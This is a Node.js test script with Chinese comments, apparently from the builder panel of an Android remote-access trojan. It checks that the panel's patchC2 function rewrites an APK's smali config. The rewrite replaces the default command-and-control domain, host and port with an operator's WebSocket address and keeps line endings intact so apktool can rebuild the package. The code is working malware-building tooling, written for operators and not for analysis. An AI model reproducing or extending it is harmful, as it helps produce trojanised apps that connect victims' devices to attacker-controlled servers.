// 验证 AppCtrl.patchC2 在「方案 B（ws:// + path）」的新 smali 上仍然命中。
// 这一步必须实测：patchC2 一旦匹配不到锚点就返回 null / 静默空操作，
// 面板会正常出包但连的是默认 C2 —— 以前踩过两次（?model= 改名、CRLF 行尾）。
//
// 用法: node tools/test_patch_c2_ws.js
const fs = require('fs');
const path = require('path');

const root = path.join(__dirname, '..');
const appCtrlPath = path.join(root, 'piupiupiu-Server', 'app', 'app', 'assets', 'js', 'controllers', 'AppCtrl.js');
const smaliPath = path.join(root, 'piupiupiu-Server', 'app', 'app', 'Factory', 'piupiupiu', 'smali', 'com', 'piupiupiu', 'AppConfig.smali');

// patchC2 内部引用 CONSTANTS.wsPath，eval 前先准备好作用域
const CONSTANTS = require(path.join(root, 'piupiupiu-Server', 'app', 'app', 'assets', 'js', 'Constants.js'));

const src = fs.readFileSync(appCtrlPath, 'utf8');
const start = src.indexOf('$appCtrl.patchC2 = (data, ip, port) => {');
if (start < 0) {
  console.error('FAIL: 在 AppCtrl.js 里找不到 patchC2');
  process.exit(1);
}
const end = src.indexOf('\n    }\n', start);
const $appCtrl = {};
eval(src.slice(start, end + '\n    }\n'.length));

const original = fs.readFileSync(smaliPath, 'utf8');
const ip = '192.0.2.77';
const port = '9090';

const out = $appCtrl.patchC2(original, ip, port);

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

console.log('[*] patchC2 / WebSocket 版');
console.log('[*] wsPath = ' + CONSTANTS.wsPath + '   目标 = ws://' + ip + ':' + port + CONSTANTS.wsPath);
console.log('');

check('patchC2 未返回 null（锚点命中）', out !== null);
if (out === null) {
  console.log('\n结果: FAIL ' + fail + ' / PASS ' + pass);
  process.exit(1);
}

check('原 C2 域名已被替换掉', !out.includes('update.syskit-service.net'));
check('写入了新的 ws 基址', out.includes('ws://' + ip + ':' + port + CONSTANTS.wsPath),
  out.match(/const-string v\d+, "[^"]*"/) ? out.match(/const-string v\d+, "[^"]*"/)[0] : '未找到 const-string');
check('.field C2_HOST 改写为目标 IP', out.includes('C2_HOST:Ljava/lang/String; = "' + ip + '"'));
check('.field C2_PORT 改写为目标端口', out.includes('C2_PORT:I = ' + port));
check('旧的 0x1f90 端口不再残留', !out.includes('0x1f90'));

// 行尾必须保持 CRLF（apktool 在 Windows 上写出 CRLF，乱改会让 smali 编不过）
const crlfBefore = original.indexOf('\r\n') !== -1;
const crlfAfter = out.indexOf('\r\n') !== -1;
check('换行符保持原样（CRLF=' + crlfBefore + '）', crlfBefore === crlfAfter, 'after=' + crlfAfter);

console.log('');
console.log('结果: PASS ' + pass + ' / FAIL ' + fail);
process.exit(fail === 0 ? 0 : 1);
